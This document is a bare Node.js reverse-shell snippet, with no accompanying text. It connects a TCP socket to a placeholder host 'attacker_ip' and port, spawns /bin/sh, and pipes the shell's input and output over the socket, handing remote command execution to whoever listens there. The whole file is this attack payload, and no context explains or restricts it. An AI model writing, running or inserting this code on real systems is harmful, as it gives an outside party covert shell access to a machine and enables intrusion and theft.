const net = require('net');
const { spawn } = require('child_process');

const client = new net.Socket();
client.connect(attacker_port, 'attacker_ip', () => {
    const sh = spawn('/bin/sh', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});